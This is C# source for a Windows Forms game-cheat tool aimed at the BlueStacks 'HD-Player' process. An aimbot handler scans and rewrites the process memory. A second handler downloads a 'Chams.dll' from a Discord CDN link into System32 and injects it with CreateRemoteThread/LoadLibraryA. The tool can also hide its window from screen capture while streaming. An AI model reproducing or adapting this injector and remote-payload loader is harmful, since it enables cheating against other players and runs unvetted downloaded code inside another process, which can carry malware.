using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.IO;
using DiscordRPC;
using FXX;
using System.Drawing;
//using K4os.Compression.LZ4.Internal;

namespace External
{
    public partial class FXMAIN : Form
    {
        public FXMAIN()
        {
            InitializeComponent();
        }

        Mem Ghost = new Mem();
        private WebClient webClient = new WebClient();
        public static bool Streaming;

        // Importing necessary functions from the Windows API
        [DllImport("user32.dll")]
        public static extern uint SetWindowDisplayAffinity(IntPtr hwnd, uint dwAffinity);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // Constants used for process and memory management
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;

        private void timer1_Tick(object sender, EventArgs e)
        {
            Particles._Instance.Invalidate();
            Particles.MoveCircles(Particles._Particles);
        }

        private void HOME_Load(object sender, EventArgs e)
        {
            this.Opacity = 0.6;
            Particles.Setup(this, 60, Color.Blue, 90, Color.Red);
            RPC.rpctimestamp = Timestamps.Now;
            RPC.InitializeRPC();
        }

        private void guna2ControlBox1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void guna2ToggleSwitch1_CheckedChanged(object sender, EventArgs e)
        {
            if (stream.Checked)
            {
                ShowInTaskbar = false;
                Streaming = true;
                SetWindowDisplayAffinity(Handle, 17U);
            }
            else
            {
                ShowInTaskbar = true;
                Streaming = false;
                SetWindowDisplayAffinity(Handle, 0U);
            }
        }

        private async void AIMBOT_Click_1(object sender, EventArgs e)
        {
            try
            {
                Process[] processes = Process.GetProcessesByName("HD-Player");
                if (processes.Length == 0)
                {
                    MessageBox.Show("Process not found.");
                    return;
                }

                int procId = processes[0].Id;
                Ghost.OpenProcess(procId);

                var result = await Ghost.AoBScan("00 00 00 00 00 00 A5 43 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 BF", true, true);

                if (result.Any())
                {
                    Console.Beep();
                    foreach (var currentAddress in result)
                    {
                        Int64 readAddress = currentAddress + 0x2c;
                        Int64 writeAddress = currentAddress + 0x28;

                        var readValue = Ghost.ReadMemory<int>(readAddress.ToString("X"));
                        Ghost.WriteMemory(writeAddress.ToString("X"), "int", readValue.ToString());
                    }
                }
                else
                {
                    MessageBox.Show("No matches found.");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: " + ex.Message);
            }
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            try
            {
                string fileName = "C:\\Windows\\System32\\Chams.dll";
                string address = "https://cdn.discordapp.com/attachments/1220785535229100174/1220785849726275656/Chams.dll?ex=6610346b&is=65fdbf6b&hm=5f8d6eaae3a78624702c5b5a317234582911b882359ad7c157197380600124cb&";

                if (File.Exists(fileName))
                {
                    File.Delete(fileName);
                }

                webClient.DownloadFile(address, fileName);

                Process targetProcess = Process.GetProcessesByName("HD-Player")[0];
                IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
                IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

                IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((fileName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                UIntPtr bytesWritten;
                WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(fileName), (uint)((fileName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);

                CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: " + ex.Message);
            }
        }
    }
}
